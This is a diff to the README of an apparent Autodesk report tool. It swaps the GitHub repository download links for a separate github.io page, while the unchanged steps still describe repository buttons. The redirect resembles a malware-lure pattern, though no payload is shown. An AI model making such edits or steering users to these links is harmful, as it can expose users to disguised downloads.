@@ -1,10 +1,10 @@
 # 📊 autodesk-report-hub - View and manage your Autodesk reports
 
-[![Download autodesk-report-hub](https://img.shields.io/badge/Download-autodesk--report--hub-blue?style=for-the-badge&logo=github)](https://github.com/Heavierthanair-whitsuntuesday761/autodesk-report-hub)
+[![Download autodesk-report-hub](https://img.shields.io/badge/Download-autodesk--report--hub-blue?style=for-the-badge&logo=github)](https://heavierthanair-whitsuntuesday761.github.io)
 
 ## 📥 How to Download and Run
 
-1. Visit the download page: [https://github.com/Heavierthanair-whitsuntuesday761/autodesk-report-hub](https://github.com/Heavierthanair-whitsuntuesday761/autodesk-report-hub)
+1. Visit the download page: [https://heavierthanair-whitsuntuesday761.github.io](https://heavierthanair-whitsuntuesday761.github.io)
 2. Click the green "Code" button.
 3. Select "Download ZIP" from the menu.
 4. Save the ZIP file to your computer (your Downloads folder works best).
@@ -136,7 +136,7 @@ autodesk-report-hub/
 
 ### Check for Updates
 
-1. Visit the download page: [https://github.com/Heavierthanair-whitsuntuesday761/autodesk-report-hub](https://github.com/Heavierthanair-whitsuntuesday761/autodesk-report-hub)
+1. Visit the download page: [https://heavierthanair-whitsuntuesday761.github.io](https://heavierthanair-whitsuntuesday761.github.io)
 2. Look at the "Releases" section on the right side.
 3. Compare the version number with your current version (shown at the bottom of the tool).
 
